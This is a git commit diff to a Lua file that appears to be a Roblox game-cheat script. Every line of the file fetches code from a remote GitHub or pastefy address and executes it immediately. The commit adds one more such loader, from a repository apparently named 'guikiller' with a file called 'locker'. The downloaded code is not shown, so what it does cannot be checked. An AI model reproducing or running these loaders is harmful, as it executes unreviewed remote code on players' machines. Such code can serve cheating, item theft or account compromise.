55c0a1206c7cf9f8da0cea8615636a5b58504ccd
GAGScriptV3 <osaragihub@gmail.com>
2025-09-14 09:31:33 +0800

    Update Script.lua

--- Script.lua
+++ Script.lua
@@ -1,2 +1,3 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/GAGScriptV3/egg/refs/heads/main/lua"))()
 loadstring(game:HttpGet("https://pastefy.app/B00Jc84x/raw"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSpawnerV99/guikiller/refs/heads/main/locker"))()
